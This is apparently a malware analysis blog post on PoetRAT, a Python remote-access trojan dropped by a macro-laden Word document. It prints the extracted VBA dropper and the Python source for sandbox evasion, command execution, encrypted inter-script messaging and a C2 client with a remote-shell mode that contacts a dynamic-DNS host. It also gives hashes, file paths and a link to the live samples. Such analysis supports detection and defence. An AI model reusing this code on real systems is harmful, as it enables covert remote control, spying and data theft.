---
title: PoetRAT
author: Abdelrahman Eldawi
date: 2021-09-26 00:00:00 +0800
categories: [malware-reports]
tags: [dropper,macro,obfuscated-macro,rat,python]
math: false
mermaid: true
image:
  src: https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/PoetRAT-blog.jpg?raw=true
  width: 850
  height: 585
---
**Document info**

Sample Name: PoetRAT

**Description:**

Python RAT uses COVID-19 document lures to target Azerbaijan public and private sectors.

Azerbaijan government and energy sector likely targeted by an unknown actor. 

From the energy sector, the actor demonstrates interest in SCADA systems related to wind turbines.

Attachments: Malware dropped archive including malicious python scripts (Pw:infected)

[https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/password%20infected.rar](https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/password%20infected.rar)

**Sample Information**

SHA256:208EC23C233580DBFC53AAD5655845F7152ADA56DD6A5C780D54E84A9D227407

MD5:3AADBF7E527FC1A050E1C97FEA1CBA4D

SHA1:2CF055B3EF60582CA72E77BC4693EA306360F611

Version: 4

Sample Type: Trojan dropper, Remote Administration Tool (RAT)

**Executive Summary**

This malware is a word document, by opening this document a malicious
script is executed (Macro VBA script), it drops a malware in your system
which connects to the command-and-control server giving it instructions
to be executed in your machine, this malware can be used for various
purposes, including, but not limited to Information stealing, spying and
capabilities can be leveraged by having another malware executed without
your permission.

# Initial assessment

At Malware initial assessment using **Pestudio**, by looking to its
magic bytes it looks like that this file is not .exe file, by checking
the file signature "D0 CF 11 E0 A1 B1 1A E1" we can narrow the
possibilities to (**doc, xls, ppt**) extensions

# Virus Total scan

![](https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/image1.png?raw=true){width="3.998611111111111in"
height="5.053030402449694in"}

After virus total scan as it appears that its Microsoft word file
behaves as Downloader & dropper so apparently it has macro

# Dynamic analysis using sandbox

Using **any.run** service it was found that Microsoft word process is
opening 3 CMD to execute python scripts.

![](https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/image2.png?raw=true){width="6.5in"
height="4.403472222222222in"}

# 

# Macro extraction

By using **ViperMonkey** I was able to extract the VBA macros

![](https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/image3.png?raw=true){width="6.5in"
height="3.213888888888889in"}

# Extracted VBA macro

from vb2py.vbfunctions import \*\
from vb2py.vbdebug import \*\
def document_open():\
    data = String()\
    User = String()\
    bla = String()\
    Coper = Object()\
    ActiveDocument.ActiveWindow.View.ReadingLayout = False\
    ActiveDocument.Unprotect(\'securePass\')\
    show()\
    ActiveDocument.Protect(wdAllowOnlyReading, True, \'securePass\', False, False)\
    User = \'C:\\\\Users\\\\Public\'\
    Docer = ActiveDocument.FullName\
    #Copy\
    Shell(\'cmd /c copy \' + Docer + \' \' + User + \'\\\\docer.doc\', vbHide)\
    deay()(( 4 ))\
    data = bin2var(User + \'\\\\docer.doc\')\
    data = Right(data, 7074638)\
    var2bin(User + \'\\\\smile.zip\', data)\
    bla = VBA.FileSystem.Dir(User + \'\\\\Python37\', vbDirectory)\
    if bla != VBA.Constants.vbNullString:\
        Shell(\'cmd /c rmdir /s /q \' + User + \'\\\\Python37\', vbHide)\
        deay()(( 2 ))\
    #Unzip\
    Unzip(User + \'\\\\smile.zip\', User, \'Python37\')\
    #Clean\
    Kill(User + \'\\\\smile.zip\')\
    Kill(User + \'\\\\docer.doc\')\
    #Run\
    Shell(\'\"\' + User + \'\\\\Python37\\\\python.exe\' + \'\" \"\' + User + \'\\\\Python37\\\\launcher.py\' + \'\"\', vbHide)\
\
def bin2var(filename):\
    f = **Integer**()\
    #Which alters **when** it alteration finds,\
    #**Or** bends **with** the remover **to** remove.\
    f = FreeFile()\
    VBFiles.openFile(f, filename, \'b\') # VB2PY (UnknownFileMode) \'Access\', \'Read\', \'Lock\', \'Write\'\
    fn_return_value = Space(FileLen(filename))\
    **Get**(f, VBGetMissingArgument(**Get**, 1), bin2var())\
    VBFiles.closeFile(f)\
    #O no! it **is** an ever-fixed mark\
    #That looks **on** tempests **and** **is** never shaken;\
    **return** fn_return_value\
\
def var2bin(filename, data):\
    f = **Integer**()\
    #**If** this be **error** **and** upon **me** prov\'d,\
    #I never writ, nor no man ever lov\'d.\
    f = FreeFile()\
    VBFiles.openFile(f, filename, \'w\') # VB2PY (UnknownFileMode) \'Access\', \'Write\', \'Lock\', \'Write\'\
    VBFiles.writeText(f, data)\
    VBFiles.closeFile(f)\
def Unzip(Fname, DefPath, TarFold):\
    oApp = Object()\
    FileNameFolder = **Variant**()\
    #Root folder **for** the **new** folder.\
    if Right(DefPath, 1) != \'\\\\\':\
        DefPath = DefPath + \'\\\\\'\
    #Create the folder name\
    strDate = Format(Now, \' dd-mm-yy h-mm-ss\')\
    FileNameFolder = DefPath + TarFold + \'\\\\\'\
    #Make the normal folder **in** DefPath\
    MkDir(FileNameFolder)\
    #Extract the files into the newly created folder\
    oApp = CreateObject(\'Shell.Application\')\
    oApp.**Namespace**(FileNameFolder).CopyHere(oApp.**Namespace**(Fname).items, 4)\
def hide():\
    ActiveDocument.Sections\[1\].Range.Font.Hidden = False\
    **for** Section **in** ActiveDocument.Sections:\
        if Section.Index > 1:\
            Section.Range.Font.Hidden = True\
def show():\
    ActiveDocument.Sections\[1\].Range.Font.Hidden = True\
    **for** Section **in** ActiveDocument.Sections:\
        if Section.Index > 1:\
            Section.Range.Font.Hidden = False\
def deay(min):\
    ptr = **Variant**()\
    ptr = DateAdd(\'s\', min, Time())\
    if ptr > Time():\
        **while** **not** (( Time() > ptr )):\
            pass\
    **return** fn_return_value

# VBA Macro Analysis

At first it copies the document file to
"**C:\\Users\\Public\\docer.doc**"

Then it executes "**bin2var**" function which extracts the latest
"**7074638 Bytes**" from the document and creates "**smile.zip**", So
this python script can be used to extract the zip file from the document

f = open(\'Sample1\', \'rb\')

content = f.read()

zip_file = content\[len(content)-7074638:len(content)\]

z= open(\'Sample.zip\',\'wb\')

z.write(zip_file)

f.close()

z.close()

then it unzips it into "**C:\\Users\\Public\\ Python37**", Apparently
the extracted files are **python version 3.7** and some **malicious
scripts**

**"affine.py, backer.py, frown.py, launcher.py, smile.py,
smile_funs.py"**

Then it launches the "**Launcher.py**" script

<https://attack.mitre.org/techniques/T1059/>

# Malicious scripts analysis

## **Launcher.py**

import shutil\
import sys\
import time\
import uuid\
import smile_funs\
me = sys.argv\[0\]\
fold = me\[:me.rfind(\"\\\\\") + 1\]\
\
**def** police():\
    smile_funs.run_cmd(\"\\\"{0}python.exe\\\" \\\"{0}smile.py\\\"\".format(fold), False)\
    time.sleep(5)\
    smile_funs.run_cmd(\"\\\"{0}python.exe\\\" \\\"{0}frown.py\\\"\".format(fold), False)\
**def** crack():\
    # Crack everything at this point\
    **open**(fold + \"smile.py\", \"wb\").write(**open**(fold + \"LICENSE.txt\", \"rb\").read())\
    **open**(fold + \"smile_funs.py\", \"wb\").write(**open**(fold + \"LICENSE.txt\", \"rb\").read())\
    **open**(fold + \"frown.py\", \"wb\").write(**open**(fold + \"LICENSE.txt\", \"rb\").read())\
    sys.exit(4)\
**def** good_disk_size():\
    # There are no computers with disk size less than 62\
    **return** 62 \< **round**(shutil.disk_usage(\"/\")\[0\]) / 2 \*\* 30\
**if** \_\_name\_\_ == \'\_\_main\_\_\':\
    **if** **len**(sys.argv) == 2:\
        **if** sys.argv\[1\] == \"police\":\
            police()\
    **else**:\
        # Sandbox Evasion\
        **if** **not** good_disk_size():\
            crack()\
            sys.exit(0)\
        # Reaching this far means that we are not in a sandbox, Probably\
        d = **open**(fold + \"frown.py\", \"r\").read()\
        uu = **str**(uuid.uuid4())\
        d = d.replace(\"THE_GUID_KEY\", uu)\
        **open**(fold + \"frown.py\", \"w\").write(d)\
        **open**(fold + \".key\", \"w+\").write(uu)\
        police()

If there are **no arguments passed**

-   It will check the **containing disk size**, if it\'s less than **64gb** then it would be **sandbox** 

-   If so it activates "**crack function"**, which destroys the 3
    scripts (**smile.py, smile_funs.py, frown.py**) by **overwriting
    their contents** with (**LICENSE.txt**) content as an **anti-sandbox
    technique**.

-   if sandbox check determined that it's not a sandbox, **it will
    generate an "UUID" and replace "THE_GUID_KEY\" word in "Frown.py"
    script with it**

-   Then it writes the "**THE_GUID_KEY**" into ".**key**" file

-   Then it fires **Police function**.

**Police function**

-   It launches both "**Smile.py, Frown.py"** files.

This function is basically launched under two cases, the first one is
**passing argument "Police"** or continuing the flow of the script
**after writing ".key" file**.

## **Smile.py** 

import multiprocessing\
import sys\
from colorama import init as c_init, Fore, Style\
from affine import Affine\
from smile_funs import \*\
c_init()\
wanted = True\
**def** communicate():\
    resp = \"\"\
    aff = Affine()\
    **while** resp != \"exit\":\
        **try**:\
            header = f\"\"\"\\n{Fore.RED}{getuser()}\@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}\$ \"\"\"\
            **try**:\
                it = **open**(pipe_out, \"wb\")\
                it.truncate(0)\
                it.write(aff.encrypt(resp + header))\
                resp = \"\"\
                it.close()\
            **except** Exception as e:\
                it = **open**(pipe_out, \"w+\")\
                it.truncate(0)\
                it.write(aff.encrypt(**str**(e) + header))\
                it.close()\
            file_ready()\
\
            waiting_file()\
            cmd = aff.decrypt(**open**(pipe_out, \"rb\").read())\
            **if** **len**(cmd) > 2 **and** \"\$\$\" == cmd\[0:2\]:\
                receiver, sender = multiprocessing.Pipe(False)\
                process = multiprocessing.Process(target=work_on_cmd_process, name=cmd\[2:\], args=(cmd\[2:\], sender),\
                                                  daemon=True)\
                processes.append({\"process\": process, \"receiver\": receiver, \"data\": \"\", \"root\": os.getcwd()})\
                process.start()\
            **else**:\
                resp = work_on_cmd(cmd)\
        **except** Exception as e:\
            **with** **open**(pipe_out + \"BADD\", \"w+\") as f:\
                f.write((\"\\n\\nBad Error Happened \" + **str**(e) + \"\\n\\n\\n\\n\" + **str**(resp)))\
    **global** wanted\
    **if** resp == \"exit\":\
        wanted = False

    time.sleep(0.5)\
**def** main():\
    **while** wanted:\
        communicate()\
    sys.exit(0)\
**if** \_\_name\_\_ == \"\_\_main\_\_\":\
    main()

it executes the communication function whilst the victim is still
**wanted**, this status means that the victim is still a matter of
interest.

**Communicate function**: -

-   It sets a header which consists of username + current path as if
    it's a cmd (ex: username\@pc_name:execution_path\$)

-   It writes it in "**Abibliophobia23**" file which used for
    inter-scripts communications and writes the response and header on
    it.

-   It writes 0 in **".ready**" and waits for another script
    (**frown.py**) to set it, as if it's a **synchronization mechanism**
    to make sure that every script do its job in turns.

-   Start executing the commands stored in "**Abibliophobia23**" as
    **CMD** commands and if the resp was \"**exit**\" then will go
    through process of **termination** and "**frown.py" would have been
    terminated by then**.

## **Frown.py**

**def** recv(size, wait=False):\
    ready = select.select(\[sock\], \[\], \[\], 187)\
    **if** wait:\
        **while** **not** ready\[0\]:\
            **if** **not** is_connected():\
                **return** False\
            ready = select.select(\[sock\], \[\], \[\], 187)\
    **if** ready\[0\]:\
        d = sock.recv(size)\
        **if** **not** d:\
            **raise** ConnectionResetError()\
        **return** d.decode()\
    **return** False\
**def** run_cmd(cmd, wait=True):\
    **if** **not** wait:\
        Popen(cmd, shell=True)\
        **return** \"\"\
    comm = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE, universal_newlines=True)\
    stdout, stderr = comm.communicate()\
    **if** **not** stdout:\
        **return** **str**(stderr)\
    **return** **str**(stdout)\
**def** connect():\
    **global** sock\
    **while** True:\
        **try**:\
            context = ssl.SSLContext(ssl.PROTOCOL_TLS)\
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\
            sock = context.wrap_socket(s, server_hostname=host)\
            sock.connect((host, port))\
            sock.send(b\"almond\")\
            res = recv(5, True)\
            **if** \"who\" **in** res:\
                sock.send(f\"\"\"{getuser()}\@{node()}-{guid}\"\"\".encode())\
                res = recv(5, True)\
            **if** \"ice\" **in** res:\
                **break**\
        **except** Exception as e:\
            sleep(183)\
\
**def** is_connected():\
    **if** **not** online():\
        **return** False\
    **try**:\
        sock.send(b\'\\x00\')\
        **return** True\
    **except**:\
        **return** False\
**def** online():\
    **try**:\
        socket.setdefaulttimeout(260)\
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((\"google.com\", 80))\
        **return** True\
    **except** Exception as exp:\
        **return** False\
**def** file_ready():\
    **open**(pipe_out + \".ready\", \"w+\").write(\'1\')\
**def** waiting_file():\
    count = 1000\
    **while** **open**(pipe_out + \".ready\", \"r\").read() != \'0\' **and** count > 0:\
        sleep(0.5)\
        count -= 1\
**def** communicate():\
    **global** wanted\
    aff = Affine()\
    **try**:\
        d = **open**(pipe_out, \"rb\").read()\
        **if** **len**(d) == 0:\
            d = \"EMPTY\"\
        **else**:\
            d = aff.decrypt(d)\
        sock.send(d.encode())\
        res = recv(4028, True)\
        it = **open**(pipe_out, \"wb\")\
        **if** res.rstrip() == \"exit\":\
            wanted = False\
        **elif** res.rstrip() == \"dis\":\
            it.close()\
            sys.exit(0)\
        **elif** res.rstrip() == \"##\":\
            **while** res.rstrip() != \"exit\":\
                res = recv(4028, True)\
                sock.send(run_cmd(res.rstrip()).encode())\
            **return**\
        it.truncate(0)\
        res = aff.encrypt(res)\
        it.write(res)\
        it.close()\
        file_ready()\
    **except** ConnectionResetError:\
        sock.close()\
    **except** Exception as e:\
        **if** is_connected():\
            sock.send(\"An error has occurred: {}\".format(**str**(e)).encode())\
**def** main():\
    sleep(83)\
    **while** wanted:\
        **try**:\
            waiting_file()\
            **if** **not** is_connected():\
                connect()\
            communicate()\
        **except** Exception as a:\
            **if** is_connected():\
                sock.send(**str**(a).encode())

So basically, how this works?

-   At first it waits **83 secs** then it will wait till "**smile.py**"
    **signals** that its first part was already finished and
    **".ready**" is set to **0**

-   it checks whether there is an **internet connection** on victims'
    machine

-   checks whether it has an **established connection with C&C and
    connect if not**

-   after it connects it will **send** the String "**almond**"

-   if the reply is \"**who**\", **it will send the identifier of the
    victim**

-   it waits for the word "**ice**" then the connection is good and the
    C&C server **identified the victim successfully**.

after a successful connection is made there are 4 cases for the reply,
if malware received:

-   **exit**: it means that they are **no longer interested in this
    victim** and will go through the **process of terminating the
    operation**.

-   **dis**: **disconnect the victim and shutdown the script frown.py**.

-   **##:** **it switches the connection to remote shell like**, it
    executes the commands received **interactively** and **reply with
    the output** until C&C send "**exit**" then it **ends the session**.

-   **if those cases aren\'t met** it will **write the response into
    intercommunication file**, then it will set **".ready**" file to
    **1** signaling the other script that this part was already done to
    get it **continue executing those commands**.

**This process is going to be repeated until "exit, dis" is received.**

## **Affine.py**

import base64\
**class** Affine(**object**):\
    DIE = 128\
    KEY = (7, 3, 55)\
\
    **def** \_\_init\_\_(self):\
        **pass**\
\
    **def** encrypt_char(self, char):\
        K1, K2, kI = self.KEY\
        **return** **chr**((K1 \* **ord**(**str**(char)) + K2) % self.DIE)\
\
    **def** encrypt(self, string):\
        st = base64.b64encode(string.encode(\"utf-8\")).decode()\
        **return** \"\".join(**map**(self.encrypt_char, st)).encode()\
\
    **def** decrypt_char(self, char):\
        K1, K2, KI = self.KEY\
        **return** **chr**(KI \* (**ord**(**str**(char)) - K2) % self.DIE)\
\
    **def** decrypt(self, string):\
        **try**:\
            string = string.decode()\
        **except**:\
            **pass**\
        st = \"\".join(**map**(self.decrypt_char, string))\
        **return** base64.b64decode(st.encode()).decode(\"utf-8\")

Affine script is used as encryption/decryption module it's initialized
in all scripts communicating through "**Abibliophobia23**" file, noting
that all writing/reading this file is always accompanied by
encrypting/decrypting function used

## **Smile_funs.py**

Source code was attached alongside the report because of its extreme
length.

This script defines the capabilities of the malware, because it's the
library that was used by "**smile.py"** which is responsible for
executing built-in commands.

# Malware capabilities

1.  Listing files (**ls**)
2.  Work and change directories (**cd**)
3.  Getting system info
4.  Downloading files (Using FTP protocol)
5.  Uploading files
6.  Taking and uploading screenshot
7.  Copying files
8.  Moving files
9.  Creating shortcuts like (Links)
10. Manipulating registry
11. Hiding files
12. Compressing files
13. Manipulating processes
14. Executing any **cmd** commands

# Further investigation on the host

The host found is **dellgenius.hopto.org**

**Hopto.org** domain is **NO-IP** service, it's **DDNS** service points
to dynamic IP, such services often used by malwares to make command and
control servers more resistant to takedowns and increase sustainability
on the wild.

Looked at **shodan.io** but no info was found about this host

![](https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/image4.png?raw=true){width="6.5in"
height="0.7458333333333333in"}

Looked at **securitytrails** to check for history of DNS records

![](https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/image5.png?raw=true){width="6.5in"
height="1.229861111111111in"}

It looks like year ago it was pointing to **hostkey** hosting service
which apparently was hosting the C&C server. Also, by doing a reverse IP
lookup against these IPs it looks like that one of them pointed to this
**cryptosuccesstrade.com** website, which was a fishy cryptocurrency
investing platform. Maybe they were tricking users somehow to download
the malware to steal their money.

[https://web.archive.org/web/20200509181348/http://cryptosuccesstrade.com/](https://web.archive.org/web/20200509181348/http:/cryptosuccesstrade.com/)

# Indicator of compromises

## **Hashes**

1.  **Sample1, docer.doc**\
    SHA256
    208EC23C233580DBFC53AAD5655845F7152ADA56DD6A5C780D54E84A9D227407
2.  **smile.zip**\
    SHA256
    FA97AE75665B2C16100EF7529BBD3C08861E4CA27BF27453F6B668AE77D1692E
3.  **launcher.py**\
    SHA256
    5F1C268826EC0DD0ACA8C89AB63A8A1DE0B4E810DED96CDEE4B28108F3476CE7
4.  **frown.py**\
    SHA256
    D4B7E4870795E6F593C9B3143E2BA083CF12AC0C79D2DD64B869278B0247C247
5.  **smile.py**\
    SHA256
    252C5D491747A42175C7C57CCC5965E3A7B83EB5F964776EF108539B0A29B2EE
    
6.  **smile_funs.py**\
    SHA256
    312F54943EBFD68E927E9AA95A98CA6F2D3572BF99DA6B448C5144864824C04D
7.  **backer.py**\
    SHA256
    CA8492139C556EAC6710FE73BA31B53302505A8CC57338E4D2146BDFA8F69BDB**\
    
8.  **affine.py**\
    SHA256
    B1E7DC16E24EBEB60BC6753C54E940C3E7664E9FCB130BD663129ECDB5818FCD
    
    

## **Files**

1.  C:\\Users\\Public\\smile.zip
2.  C:\\Users\\Public\\docer.doc
3.  C:\\Users\\Public\\Python37\\launcher.py
4.  C:\\Users\\Public\\Python37\\frown.py
5.  C:\\Users\\Public\\Python37\\smile.py
6.  C:\\Users\\Public\\Python37\\smile_funs.py
7.  C:\\Users\\Public\\Python37\\backer.py
8.  C:\\Users\\Public\\Python37\\affine.py
9.  C:\\Users\\Public\\Python37\\.key
10. C:\\Users\\Public\\Python37\\.ready

## **Hosts**

1.  dellgenius.hopto.org:143
